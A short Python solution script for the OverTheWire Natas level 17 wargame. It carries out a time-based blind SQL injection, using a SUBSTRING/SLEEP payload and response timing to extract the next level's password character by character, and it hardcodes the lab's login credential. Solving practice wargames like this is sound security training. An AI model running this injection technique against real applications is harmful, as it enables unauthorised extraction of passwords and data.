# This code adds some functionality to natas16.py by using time dalay for extracting password

import requests
import string
import time

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url = "http://natas17.natas.labs.overthewire.org"

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

extracted_password = ""

password_length = 32

# Time delay. If the guessed character is correct, the server will be forced to pause for 5 seconds before responding.
delay_time = 5

for i in range(1, password_length + 1):
    for char in characters:
        # This line adds extra function that if the ith character equals char then the server executes 5 sec delay (sleep)
        # SLEEP({delay_time}) will only occur if the char at position i equals char
        # '#'is used to comment out the rest SQL query
        injection = f'natas18" AND BINARY SUBSTRING(password,{i},1)="{char}" AND SLEEP({delay_time})#'
        
        # Measures the time taken to get a response. This important to determine whether a guessed character in the password is correct (signal as corectness)
        start_time = time.time()
        response = requests.post(url, auth=(username, password), data={"username": injection})
        end_time = time.time()
        
        # Checks if the response was delayed by the specified amount of time, if yes, then char is added to the extracted_password 
        if (end_time - start_time) >= delay_time:
            extracted_password += char
            print(f"Generating password: {extracted_password}")
            break

print(f"Final password for natas18: {extracted_password}")
